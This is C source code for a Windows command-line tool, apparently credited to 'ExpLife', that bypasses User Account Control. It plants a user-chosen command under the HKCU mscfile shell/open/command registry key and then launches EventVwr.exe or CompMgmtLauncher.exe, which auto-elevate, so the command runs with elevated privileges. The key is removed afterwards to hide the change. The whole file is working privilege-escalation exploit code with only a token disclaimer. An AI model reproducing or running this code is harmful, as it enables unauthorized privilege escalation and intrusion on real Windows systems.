#include "stdafx.h"

#include <windows.h>
#include <shlwapi.h>

#pragma comment(lib, "shlwapi.lib")

#define DATA_SIZE 1024

typedef VOID  (WINAPI * PFN_GetNativeSystemInfo)(OUT  LPSYSTEM_INFO);
typedef BOOL   (WINAPI * PFN_Wow64DisableWow64FsRedirection)(OUT  PVOID*);
typedef BOOL  (WINAPI * PFN_Wow64RevertWow64FsRedirection)(OUT  PVOID);

BOOL Is64System();
BOOL SetRegKeyStrVal(HKEY hKey,LPCSTR lpSubKey,LPCSTR lpData);
BOOL DeleteRegKey(HKEY hKey,LPCSTR lpSubKey);
VOID BypassUac(CHAR* lpData, DWORD dwIndex);
VOID PrintLove();
VOID Help();

BOOL Is64System()
{
	SYSTEM_INFO si = {0};

	PFN_GetNativeSystemInfo pfnGetNativeSystemInfo = \
		(PFN_GetNativeSystemInfo)GetProcAddress(GetModuleHandle("Kernel32.dll"), "GetNativeSystemInfo");

	if (pfnGetNativeSystemInfo)
	{
		pfnGetNativeSystemInfo(&si);

		if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 ||
			si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_IA64)
		{
			return TRUE;
		}
	}

	return FALSE;
}

BOOL SetRegKeyStrVal(HKEY hKey,LPCSTR lpSubKey,LPCSTR lpData)
{
	HKEY hRoot = NULL;
	DWORD dwDisposition = 0;
	DWORD cbData = 0;
	DWORD dwRet = 0;
	REGSAM samDesired = KEY_ALL_ACCESS;
	BYTE szBuffer[MAX_PATH] = {0};
	CHAR szSysDir[MAX_PATH] = {0};
	CHAR szCommand[MAX_PATH] = {0};


	if (Is64System())
	{
		samDesired |= KEY_WOW64_64KEY;
	}

	if ((RegCreateKeyEx(hKey, lpSubKey, 0, NULL, 0, samDesired,NULL, &hRoot,&dwDisposition)) != ERROR_SUCCESS)
	{
		return FALSE;
	}

	dwRet = RegQueryValueEx( hRoot,
		NULL,
		NULL,
		NULL,
		szBuffer,
		&cbData );

	if (dwRet == ERROR_SUCCESS || dwRet == ERROR_MORE_DATA)
	{
		RegDeleteKey(hKey,lpSubKey);
		RegCloseKey(hRoot);

		if ((RegCreateKeyEx(hKey, lpSubKey, 0, NULL, 0, samDesired,NULL, &hRoot,&dwDisposition)) != ERROR_SUCCESS)
		{
			return FALSE;
		}
	}

	if (RegSetValueEx(hRoot,NULL,0,REG_SZ, (BYTE *)lpData,strlen(lpData)))
	{
		return FALSE;
	}

	if (RegCloseKey(hRoot))
	{
		return FALSE;
	}

	return TRUE;
}

BOOL DeleteRegKey(HKEY hKey,LPCSTR lpSubKey)
{
	HKEY hRoot = NULL;
	DWORD  dwDisposition = 0;

	if (RegCreateKeyEx(HKEY_CURRENT_USER, lpSubKey, 0, NULL,0,KEY_ALL_ACCESS,NULL,&hRoot,&dwDisposition) != ERROR_SUCCESS)
		return FALSE;

	if (RegDeleteKey(hKey,lpSubKey) != ERROR_SUCCESS)
		return FALSE;

	if (RegCloseKey(hRoot) != ERROR_SUCCESS)
		return FALSE;

	return TRUE;
}

VOID BypassUac(CHAR* lpData, DWORD dwIndex)
{
	CHAR szSysDir[MAX_PATH] = {0};
	CHAR szSysCmd[DATA_SIZE] = {0};
	CHAR szData[DATA_SIZE] = {0};

	CONST CHAR* lpSubKey = "Software\\Classes\\mscfile\\shell\\open\\command";

	GetSystemDirectory(szSysDir, MAX_PATH);

	sprintf_s(szData, DATA_SIZE, "%s\\cmd.exe /c %s", szSysDir, lpData);

	SetRegKeyStrVal(HKEY_CURRENT_USER , lpSubKey, szData);

	switch(dwIndex)
	{
	case 0:
		sprintf_s(szSysCmd, DATA_SIZE,"%s\\cmd.exe /c %s\\%s", szSysDir, szSysDir, "CompMgmtLauncher.exe");
		break;
	case 1:
		sprintf_s(szSysCmd, DATA_SIZE,"%s\\cmd.exe /c %s\\%s", szSysDir, szSysDir, "EventVwr.exe");
		break;
	default:
		sprintf_s(szSysCmd, DATA_SIZE,"%s\\cmd.exe /c %s\\%s", szSysDir, szSysDir, "EventVwr.exe");
		break;
	}

	system(szSysCmd);

	DeleteRegKey(HKEY_CURRENT_USER , lpSubKey);
}

VOID Help()
{
	HANDLE handle = GetStdHandle(STD_OUTPUT_HANDLE);
	SetConsoleTextAttribute(handle, 2);
	printf("By ExpLife\r\n");
	SetConsoleTextAttribute(handle, 3);
	printf("Usage: XXX.exe TheFullPathOfTarget Number\r\n");
	SetConsoleTextAttribute(handle, 4);
	printf("The number parameter can be 0 or 1\r\n");
	printf("The number 0 means to use CompMgmtLauncher.exe\r\n");
	printf("The number 1 means to use EventVwr.exe\r\n");
	SetConsoleTextAttribute(handle, 5);
	printf("Do not use for illegal purposes, or author is not responsible for the consequences!\r\n");
}

int main(int argc , char * argv[])
{		
	if (argc != 3)
	{	
		Help();
		return 0;
	}

	if (strlen(argv[1]) >= 256)
	{
		Help();
		printf("The path must be less than 256.\r\n");
		return 0;
	}

	DWORD dwIndex = StrToInt(argv[2]);
	if (dwIndex != 0 && dwIndex != 1)
	{
		Help();
		printf("The second parameter invaild.\r\n");
		return 0;
	}

	if (Is64System())
	{	
		PFN_Wow64DisableWow64FsRedirection pfnWow64DisableWow64FsRedirection = \
			(PFN_Wow64DisableWow64FsRedirection)GetProcAddress(GetModuleHandle("Kernel32.dll"), "Wow64DisableWow64FsRedirection");

		PFN_Wow64RevertWow64FsRedirection pfnWow64RevertWow64FsRedirection = \
			(PFN_Wow64RevertWow64FsRedirection)GetProcAddress(GetModuleHandle("Kernel32.dll"), "Wow64RevertWow64FsRedirection");

		if (pfnWow64DisableWow64FsRedirection && pfnWow64RevertWow64FsRedirection)
		{
			PVOID OldValue;

			pfnWow64DisableWow64FsRedirection(&OldValue);

			BypassUac(argv[1], dwIndex);

			pfnWow64RevertWow64FsRedirection (OldValue);

			return 0;
		}
	}
	
	BypassUac(argv[1], dwIndex);
}

